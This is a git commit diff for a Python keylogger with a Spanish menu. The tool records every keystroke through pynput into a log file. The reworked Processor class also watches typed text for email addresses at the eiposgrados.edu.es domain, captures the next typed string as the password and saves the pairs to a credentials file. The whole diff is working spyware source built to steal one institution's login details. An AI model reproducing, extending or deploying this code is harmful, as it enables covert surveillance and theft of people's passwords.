5def9d655b711702dbae3d3a1c121692846e255f
Sergio Constantino <sergio.andreas.cn@gmail.com>
2021-12-18 23:59:56 +0100

    Memory-efficient version

--- main.py
+++ main.py
@@ -1,16 +1,8 @@
 #!/usr/bin/env python
 import enum
 import pathlib
-import re
 
-from pynput import keyboard as kb
-
-from processor import KeyProcessor
-
-BASE_DIR = pathlib.Path(__file__).resolve().parent
-LOGS = BASE_DIR / 'keylog.txt'
-CREDENTIALS = BASE_DIR / 'credentials.txt'
-EMAIL_PATTERN = re.compile(r'(?P<email>[^@\s]+@eiposgrados\.edu\.es)\s+(?P<password>[^\s]+)', flags=re.MULTILINE)
+from processor import Processor
 
 
 class Option(enum.Enum):
@@ -19,97 +11,58 @@ class Option(enum.Enum):
     READ_CREDENTIALS = 3
 
 
-def print_data_console(key_pc):
-    key_pc.print_current_key()
-
-
-def save_in_file(path, data):
-    with open(path, 'a', encoding='utf-8') as fp:
-        fp.write(data.strip())
-
-
-def detect_eip_password(path):
-    with open(path, 'r', encoding='utf-8') as fp:
-        data = fp.read()
-
-    with open(CREDENTIALS, 'a', encoding='utf-8') as fp:
-        for match in EMAIL_PATTERN.findall(data):
-            fp.write(f'{match[0]} {match[1]}\n')
-
-
-def record_key():
-    key_pc = KeyProcessor()
-    with kb.Events() as keyboard_events:
-        for event in keyboard_events:
-            if event.key == kb.Key.esc:
-                break
-            elif isinstance(event, kb.Events.Press):
-                key_pc.process(event.key)
-                print_data_console(key_pc)
-
-    save_in_file(LOGS, key_pc.data)
-    detect_eip_password(LOGS)
-
-
 def display_file(path):
     with open(path, 'r', encoding='utf-8') as fp:
         for line in fp:
             print(line)
 
 
-def read_logs():
-    display_file(LOGS)
-
-
-def read_credentials():
-    display_file(CREDENTIALS)
-
-
 def logo(path):
-    with open(path, 'r', encoding='utf-8') as input_file:
-        ascii_art = ''.join(input_file.readlines())
+    with open(path, 'r', encoding='utf-8') as fp:
+        ascii_art = ''.join(fp.readlines())
 
     return ascii_art
 
 
 def menu():
-    display = '\n'.join([
-        '¿Qué desea hacer?',
-        '\t(1) Registrar pulsaciones de teclado',
-        '\t(2) Leer registros',
-        '\t(3) Leer credenciales'
-    ])
-
-    return display
-
-
-def choose(option):
-    try:
-        option = Option(int(option))
-        if option == Option.RECORD_KEYS:
-            record_key()
-        elif option == Option.READ_LOGS:
-            read_logs()
-        elif option == Option.READ_CREDENTIALS:
-            read_credentials()
-
-    except ValueError:
-        reason = 'Opción no válida' if len(option) > 0 else 'No se ha elegido nada'
-        print(reason)
+    return '\n'.join(
+        [
+            '\n¿Qué desea hacer?',
+            '\t(1) Registrar pulsaciones de teclado',
+            '\t(2) Leer registros',
+            '\t(3) Leer credenciales\n'
+        ]
+    )
 
 
 def main():
-    print(logo(BASE_DIR / 'logo.txt'))
-    stay = True
-    while stay:
-        print(menu())
-        option = input('Escoja una opción [1-3] (Q para salir): ').lower().strip()
-        if option == 'q':
-            stay = False
-        else:
-            choose(option)
+    base_dir = pathlib.Path(__file__).resolve().parent
+    log_file = base_dir / 'keylog.txt'
+    credential_file = base_dir / 'credentials.txt'
 
-    print('¡Hasta otra!')
+    print(logo(base_dir / 'logo.txt'))
+    display = menu()
+    show = True
+    while show:
+        print(display)
+        option = input('Escoja una opción [1-3] (Q para salir): ').lower().strip()
+        try:
+            option = Option(int(option))
+            if option == Option.RECORD_KEYS:
+                Processor(log_file, credential_file).record()
+            elif option == Option.READ_LOGS:
+                display_file(log_file)
+            elif option == Option.READ_CREDENTIALS:
+                display_file(credential_file)
+
+            show = False
+
+        except ValueError:
+            if option == 'q':
+                show = False
+            else:
+                reason = f'Opción no válida: \'{option}\'' if len(option) > 0 else 'No se ha elegido nada'
+                print(reason)
 
 
 if __name__ == '__main__':
--- processor/__init__.py
+++ processor/__init__.py
@@ -1,50 +1,121 @@
+import re
+import subprocess
+
 from pynput import keyboard as kb
 
+_hex_pattern = re.compile(r'0x[\dA-Fa-f]+')
 
-class KeyProcessor:
-    __map = {
+
+def _current_window_id():
+    return int(
+        _hex_pattern.findall(
+            subprocess.run(
+                'xprop -root _NET_ACTIVE_WINDOW'.split(' '),
+                capture_output=True
+            ).stdout.decode('ascii')
+        )[0],
+        0
+    )
+
+
+class Processor:
+    __buffer_limit = 256
+    __display_map = {
         kb.Key.space: ' ',
         kb.Key.tab: '\t',
         kb.Key.enter: '\n',
         kb.Key.backspace: '\b'
     }
 
-    def __init__(self):
+    def __init__(self, log_file, credential_file):
+        self.__window_id = _current_window_id()
         self.__buffer = []
-        self.__current_key = None
+        self.__listener = kb.Listener(on_press=self.__press_callback())
+        self.__paths = {
+            'credentials': credential_file,
+            'logs': log_file
+        }
+        self.__logs = None
         self.__previous_key = None
-        self.__print_current_key = True
+        self.__current_credentials = {}
 
-    @property
-    def data(self):
-        return ''.join(self.__buffer)
+    def record(self):
+        with self.__listener, open(self.__paths['logs'], 'a', encoding='utf-8') as fp:
+            try:
+                self.__logs = fp
+                self.__listener.join()
 
-    def process(self, key):
-        register_current_key = False
+            except KeyboardInterrupt:
+                self.__listener.stop()
 
-        if isinstance(key, kb.Key) and key in self.__map:
-            self.__current_key = self.__map[key]
-            if key == kb.Key.backspace and len(self.__buffer) > 0:
-                self.__buffer.pop()
-            else:
-                register_current_key = True
+    def __detect_eip_password(self):
+        text = ''.join(self.__buffer)
+        if '@eiposgrados.edu.es' in text and self.__current_credentials.get('email') is None:
+            self.__current_credentials['email'] = text
 
-        elif isinstance(key, kb.KeyCode):
-            register_current_key = not key.is_dead
-            self.__print_current_key = register_current_key
+        elif self.__current_credentials.get('email') is not None:
+            self.__current_credentials['password'] = text
+            with open(self.__paths['credentials'], 'a', encoding='utf-8') as fp:
+                fp.write(' '.join(
+                    [
+                        self.__current_credentials['email'],
+                        self.__current_credentials['password']
+                    ]
+                ))
+                fp.write('\n')
 
-            if key.is_dead:
+            self.__current_credentials.clear()
+
+        self.__buffer.clear()
+
+    def __combine(self, key):
+        combined = key
+        if self.__previous_key is not None:
+            if isinstance(self.__previous_key, kb.Key) and isinstance(key, kb.KeyCode):
+                if all([
+                    self.__previous_key in (kb.Key.alt_r, kb.Key.alt_gr),
+                    self.__listener.canonical(key).char == '2'
+                ]):
+                    combined = kb.KeyCode(char='@')
+
+                elif all([
+                    self.__previous_key in (kb.Key.ctrl, kb.Key.ctrl_l, kb.Key.ctrl_r),
+                    self.__listener.canonical(key).char == 'c'
+                ]):
+                    if _current_window_id() == self.__window_id:
+                        raise KeyboardInterrupt
+
+            elif isinstance(self.__previous_key, kb.KeyCode) and self.__previous_key.is_dead:
+                combined = self.__previous_key.join(key)
+
+            self.__previous_key = None
+
+        return combined
+
+    def __press_callback(self):
+        def on_press(key):
+            current_key = None
+            if key in (kb.Key.alt_gr, kb.Key.alt_r, kb.Key.ctrl, kb.Key.ctrl_l, kb.Key.ctrl_r):
                 self.__previous_key = key
 
-            elif self.__previous_key is not None and self.__previous_key.is_dead:
-                self.__current_key = str(self.__previous_key.join(key).char)
-                self.__previous_key = None
-            else:
-                self.__current_key = str(key.char)
+            elif isinstance(key, kb.Key) and key in self.__display_map:
+                current_key = self.__display_map[key]
+                if key == kb.Key.backspace and len(self.__buffer) > 0:
+                    self.__buffer.pop()
 
-        if register_current_key:
-            self.__buffer.append(self.__current_key)
+                elif len(self.__buffer) > 0:
+                    self.__detect_eip_password()
 
-    def print_current_key(self):
-        if self.__print_current_key:
-            print(self.__current_key, end='')
+            elif isinstance(key, kb.KeyCode):
+                if key.is_dead:
+                    self.__previous_key = key
+
+                else:
+                    current_key = self.__combine(key).char
+                    self.__buffer.append(current_key)
+
+            if current_key is not None:
+                print(current_key, end='', flush=True)
+                self.__logs.write(current_key)
+
+        return on_press
